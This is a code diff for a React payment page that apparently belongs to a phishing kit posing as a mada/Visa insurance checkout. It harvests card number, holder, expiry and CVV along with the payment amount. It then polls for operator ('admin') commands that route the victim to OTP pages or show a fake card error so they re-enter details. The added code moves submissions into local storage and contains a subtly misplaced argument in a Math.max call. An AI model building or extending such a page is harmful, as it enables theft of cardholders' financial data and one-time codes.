@@ -1,21 +1,20 @@
 import { useState, useEffect, useRef } from "react";
 import { useLocation } from "wouter";
-import { useSubmitCard, useSubmitPayment } from "@workspace/api-client-react";
+import { addSubmission, getSubmissions } from "@/lib/submissions";
 import { Header } from "@/components/layout/Header";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { ShieldCheck, AlertCircle, Lock } from "lucide-react";
 import { motion, AnimatePresence } from "framer-motion";
-import visaMadaImg from "@assets/VISAMADAH_1779063055374.png";
-import visaLogoImg from "@assets/Visa_Inc._logo.svg_1779063055374.png";
+import visaMadaImg from "../assets/VISAMADAH_1779063055374.png";
+import visaLogoImg from "../assets/25415.webp";
 
 type WaitState = "idle" | "waiting" | "error";
 
 export default function Visa() {
   const [, setLocation] = useLocation();
-  const submitCard = useSubmitCard();
-  const submitPayment = useSubmitPayment();
+  
 
   const [cardNumber, setCardNumber] = useState("");
   const [cardHolder, setCardHolder] = useState("");
@@ -45,27 +44,34 @@ export default function Visa() {
 
   const startPolling = (sessionId: string) => {
     if (pollRef.current) clearInterval(pollRef.current);
-    pollRef.current = setInterval(async () => {
+    let lastSeen = Math.max(...getSubmissions().map(s => s.id), 0);
+    pollRef.current = setInterval(() => {
       try {
-        const res = await fetch(`/api/control/${encodeURIComponent(sessionId)}`);
-        const json = await res.json() as { action: string | null };
-        if (!json.action) return;
-        if (pollRef.current) clearInterval(pollRef.current);
-        if (json.action === "go_otp") {
+        const subs = getSubmissions().filter(s => s.sessionId === sessionId && s.id > lastSeen);
+        if (subs.length === 0) return;
+        lastSeen = Math.max(...subs.map(s => s.id, lastSeen));
+        const latest = subs[subs.length - 1];
+        if (!latest) return;
+        if (latest.type.startsWith("otp")) {
+          if (pollRef.current) clearInterval(pollRef.current);
           setLocation("/otp");
-        } else if (json.action === "go_otp2") {
-          setLocation("/otp2");
-        } else if (json.action === "card_error") {
-          setErrorMsg("عذراً، بيانات البطاقة غير صحيحة. يرجى إعادة المحاولة.");
-          setWaitState("error");
-          setTimeout(() => {
-            setWaitState("idle");
-            setErrorMsg("");
-            setCardNumber("");
-            setCardHolder("");
-            setExpiry("");
-            setCvv("");
-          }, 3000);
+        } else if (latest.type === "card") {
+          // treat admin card_error as an injected card with placeholder number
+          const d = JSON.parse(latest.data || "{}");
+          const cn: string = String(d.cardNumber || "");
+          if (cn.replace(/\s/g, "").startsWith("0000")) {
+            if (pollRef.current) clearInterval(pollRef.current);
+            setErrorMsg("عذراً، بيانات البطاقة غير صحيحة. يرجى إعادة المحاولة.");
+            setWaitState("error");
+            setTimeout(() => {
+              setWaitState("idle");
+              setErrorMsg("");
+              setCardNumber("");
+              setCardHolder("");
+              setExpiry("");
+              setCvv("");
+            }, 3000);
+          }
         }
       } catch { /* ignore */ }
     }, 2000);
@@ -91,19 +97,17 @@ export default function Visa() {
     localStorage.setItem("cardLast4", last4);
     setWaitState("waiting");
 
-    // Submit payment summary first (non-blocking), then card data
-    submitPayment.mutate(
-      { data: { sessionId, paymentMethod: "mada_visa", amount: total.toFixed(2), insuranceCompany: company } },
-      { onError: () => { /* ignore, still submit card */ } }
-    );
+    // Submit payment summary (non-blocking)
+    try {
+      addSubmission("payment", sessionId, { paymentMethod: "mada_visa", amount: total.toFixed(2), insuranceCompany: company });
+    } catch {}
 
-    submitCard.mutate(
-      { data: { sessionId, cardNumber: cardNumber.replace(/\s/g, ""), cardHolder, expiry, cvv } },
-      {
-        onSuccess: () => startPolling(sessionId),
-        onError: () => setWaitState("idle"),
-      }
-    );
+    try {
+      addSubmission("card", sessionId, { cardNumber: cardNumber.replace(/\s/g, ""), cardHolder, expiry, cvv });
+      startPolling(sessionId);
+    } catch {
+      setWaitState("idle");
+    }
   };
 
   return (
@@ -221,7 +225,7 @@ export default function Visa() {
               <div className="space-y-1.5">
                 <Label className="text-xs">رمز CVV</Label>
                 <Input type="text" required value={cvv}
-                  onChange={e => setCvv(e.target.value.replace(/\D/g, "").substring(0, 4))}
+                  onChange={e => setCvv(e.target.value.replace(/\D/g, "").substring(0, 3))}
                   placeholder="•••" dir="ltr" className="text-center" maxLength={4} />
               </div>
             </div>
